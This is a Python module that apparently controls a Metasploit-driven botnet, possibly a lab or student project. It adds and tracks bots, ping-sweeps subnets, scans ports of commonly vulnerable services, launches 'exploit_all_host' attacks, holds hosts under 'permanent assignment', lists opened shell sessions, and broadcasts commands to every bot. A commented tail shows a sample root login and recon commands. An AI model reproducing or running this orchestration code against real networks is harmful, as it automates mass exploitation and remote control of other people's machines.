import os, msfrpc, sys, subprocess
from time import sleep

import leftBottom_frame
import center_frame
import database 
import __builtin__

import bot

from network import hosts
from threading import Thread
from multiprocessing import Process
from tabulate import tabulate

from global_variables import *

botNet = {}
#PORTS = ["21", "22", "23", "25", "53", "67", "68", "80", "110", "119", "123", "137", "138", "139", "194"]
#PORTS = {"21":"FTP", "22":"SSH", "23":"TELNET", "25":"SMTP", "53":"DNS", "67":"BOOTP", "68":"BOOTP", "80":"HTTP", "110":"POP3", "123":"NTP", "137":"NETBIOS", "194":"IRC"}
PORTS = {"21":"FTP", "23":"TELNET", "139":"SAMBA", "445":"SMB", "1099":"RMI", "4444":"SSL", "6667":"IRCD" }

printB = leftBottom_frame.printTextHistory

def add_Bot():
	global newBot
	global BOT_COUNT

	newBot = bot.Bot(BOT_COUNT)
	botNet[str(BOT_COUNT)] = newBot
	
	database.save_bot(newBot)

	BOT_COUNT += 1


def add_existant_Bot(bot_JSON):
	global newBot
	global BOT_COUNT

	newBot = bot.Bot(bot_JSON['bot_id'])
	newBot.status = bot_JSON['status']
	newBot.record = bot_JSON['record']
	newBot.full_mode_record = bot_JSON['full_mode_record']
	newBot.targetHost = bot_JSON['targetHost']

	botNet[str(bot_JSON['bot_id'])] = newBot
	BOT_COUNT += 1

	if newBot.status == STATUS["3"]:
		host = hosts.get_host(str(newBot.targetHost['id']))
		newBot.continue_full_mode(host, PORTS)
		printB("[+] BOT " + str(newBot.id) + " resuming PERMANENT ASSIGNMENT ON HOST " +str(host.id) +".")


def botnet_Command(command):
  for client in botNet:
    output = client.send_command(command)
    print '[*] Output from ' + client.host
    print '[+] ' + output + '\n'

def erase_bots():
	global BOT_COUNT
	global botNet
	
	botNet = {}
	BOT_COUNT = 0
	center_frame.main_tx_box_print("[+] Zero Bots on the Army")


def get_bot(id):
	if id in botNet.keys():
		return botNet[id]
	else:
		return None

def get_bots():
	return botNet;

def bot_command(bot_id, action, host_id):
	global PORTS

	host = hosts.get_host(host_id[0])
	bot = get_bot(bot_id)

	if host != None and bot != None:
		if bot.status != STATUS['3']:
			if action == "attack":
				bot.host = host
				bot.exploit_all_host(host)

			elif action == "scan":
				if len(host_id) == 1:
					address = host.address
					bot.scan_one_host_ports(host, PORTS)

			elif action == "assign":
				bot.host = host
				bot.assign(host, PORTS)

			elif action == "protect":
				bot.host = host 
				bot.protect(host)

			elif action == "ping":
				bot.start_ping(host.address)

			else:
				printB("[!] Action unrecognized")
		else:
			printB("[!] Bot is permanently assigned.")
	else:
		printB("[!] Host or Bot does not exist.")


def show_bot(id):
	bot = get_bot(id)
	if bot != None:
		txt = "[+] Bot:" + bot.id + "\n" 
		txt +=" [*]Status: " + bot.status + "\n"
			   
		txt += " [+] Host assigned: "
		if bot.targetHost != {}:
			txt += bot.targetHost['ip'] + "\n"
			txt += "  [+] Ports: " + str(bot.targetHost['ports'])

		txt += "\n [+] Records\n"
		if len(bot.record) > 0:
			for record in bot.record:
				txt += "    [*]"+ record + "\n"

		# headers = tabulate(table, 
		# 				   headers=["BOT UNIT","ID","STATUS", "HOST ASSIGNED"], 
		# 				   tablefmt="fancy_grid", 
		# 				   stralign="center",
		# 				   numalign="center")

		center_frame.main_tx_box_print(txt)
	else:
		txt = "[!]No Bot with ID: " + id 
		center_frame.main_tx_box_print(txt)

def show_bots():
	bots = get_bots()
	table = []

	for key in bots.keys():
		bot = bots[key]
		row = [str(bot.id), bot.status]

		if 'ip' in bot.targetHost:
			line = "("+str(bot.targetHost['id'])+") "+bot.targetHost['ip']
			row.append(line)

		else:
			row.append("")
			
		row.append(SCANNED[bot.busy])

		if bot.ssh == None:
			row.append("NO")
		else:
			row.append("YES")

		table.append(row)

	headers = tabulate(table, 
						   headers=["BOT UNIT ID","STATUS", "TARGET HOST", "BUSY", "SSH"], 
						   tablefmt="fancy_grid", 
						   stralign="center",
						   numalign="center")

	center_frame.main_tx_box_print(headers)

	if len(bots.keys()) == 0:
		center_frame.main_tx_box_print("[-] No bots in the arsenal yet.")


def check_shells():

	bots = get_bots()
	OLD_SHELLS = SHELLS

	if len(bots) != 0:
		bot = botNet['0']
		
		if bot != None:
			shells = bot.msfconsole.get_sessions()
			count = 0
			for i in shells.keys():
				count += 1

		SHELLS = count

		if OLD_SHELLS < SHELLS:
			printB("[+] New Shells Opened")

		if OLD_SHELLS > SHELLS:
			printB("[+] Old Shells Opened")

def show_shells():
	bots = get_bots()

	if len(bots) == 0:
		add_bot()

	bot = botNet['0']
	
	if bot != None:
		shells = bot.msfconsole.get_sessions()
		txt = ''
		count = 0
		table = []

		for i in shells.keys():
			shell = shells[i]
			table.append([str(i), shell["username"], str(shell["session_port"]),shell["session_host"],shell["via_exploit"] ])

			count += 1

		headers = tabulate(table, 
						   headers=["SHELL","USER", "PORT", "SESSIONS", "EXPLOIT"], 
						   tablefmt="fancy_grid", 
						   stralign="center",
						   numalign="center")

		center_frame.main_tx_box_print(headers)
		SHELLS = count


		if len(shells.keys()) == 0:
			center_frame.main_tx_box_print("[-] No sessions opened yet.")


def bot_ping_sweep(bot_id, subnet):
	add_hosts_method = hosts.create_host
	bot = get_bot(bot_id)
	bot.ping_sweep(subnet)


def show_full_mode_bot_record(bot_id):
	bot = get_bot(bot_id)
	txt = "[+] Bot "+str(bot_id)+ " Records:\n"
	for line in bot.full_mode_record:
		txt += line + "\n"
	center_frame.main_tx_box_print(txt)

def bot_permanent_assignment(bot_id, host_id):
	global PORTS

	host = hosts.get_host(host_id[0])
	bot = get_bot(bot_id)

	t=Thread(target=bot.full_mode, args=(host, PORTS))
	t.daemon=True
	t.start()

	print "bot assigned"

# botNet = []
# addClient('192.168.18.130', 'root', 'mika')
# botnetCommand('uname -v') 
# botnetCommand('cat /etc/issue')
